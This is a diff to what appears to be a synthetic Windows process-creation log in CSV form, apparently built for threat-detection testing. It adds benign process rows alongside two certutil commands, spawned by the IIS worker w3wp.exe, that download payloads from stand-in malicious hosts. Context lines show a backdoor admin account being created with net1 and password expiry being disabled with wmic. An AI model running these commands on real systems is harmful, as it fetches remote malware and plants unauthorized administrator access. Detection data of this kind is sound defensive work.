@@ -29,3 +29,13 @@
 2025-10-12T08:11:45Z,web01,svc_webapp,wmic.exe,"wmic useraccount where name='admin2' set PasswordExpires=False",cmd.exe,"cmd.exe /c wmic",C:\Windows\System32\wbem\wmic.exe,Yes,1
 2025-10-12T08:12:00Z,web01,svc_webapp,net1.exe,"net1 user backupadmin Secure123! /add",cmd.exe,"cmd.exe /c net1",C:\Windows\System32\net1.exe,Yes,1
 2025-10-12T08:12:15Z,web01,svc_webapp,net1.exe,"net1 localgroup administrators backupadmin /add",cmd.exe,"cmd.exe /c net1",C:\Windows\System32\net1.exe,Yes,1
+2025-10-12T08:00:01Z,web01,svc_webapp,svchost.exe,"svchost -k netsvcs",services.exe,"services.exe",C:\Windows\System32\svchost.exe,No,1
+2025-10-12T08:01:15Z,web01,svc_webapp,chrome.exe,"chrome.exe https://intranet.local/dashboard",explorer.exe,"explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-10-12T08:02:30Z,web01,svc_webapp,taskhostw.exe,"taskhostw.exe",wininit.exe,"wininit.exe",C:\Windows\System32\taskhostw.exe,No,1
+2025-10-12T08:03:45Z,web01,svc_webapp,python.exe,"python data_cleaner.py",explorer.exe,"explorer.exe",C:\Python39\python.exe,No,1
+2025-10-12T08:04:59Z,web01,svc_webapp,code.exe,"code.exe",explorer.exe,"explorer.exe",C:\Users\svc_webapp\AppData\Local\Programs\Microsoft VS Code\Code.exe,No,1
+2025-10-12T08:05:12Z,web01,svc_webapp,certutil.exe,"certutil -urlcache -f http://malicious.site/payload.exe payload.exe",w3wp.exe,"w3wp.exe -ap \"DefaultAppPool\"",C:\Windows\System32\certutil.exe,No,1
+2025-10-12T08:05:15Z,web01,svc_webapp,certutil.exe,"certutil -f -urlcache http://evil.example.com/dropper.bin dropper.bin",w3wp.exe,"w3wp.exe -ap \"DefaultAppPool\"",C:\Windows\System32\certutil.exe,No,1
+2025-10-12T08:06:00Z,web01,svc_webapp,explorer.exe,"explorer.exe",winlogon.exe,"winlogon.exe",C:\Windows\explorer.exe,No,1
+2025-10-12T08:06:30Z,web01,svc_webapp,notepad.exe,"notepad.exe",explorer.exe,"explorer.exe",C:\Windows\System32\notepad.exe,No,1
+2025-10-12T08:07:45Z,web01,svc_webapp,conhost.exe,"conhost.exe",services.exe,"services.exe",C:\Windows\System32\conhost.exe,No,1
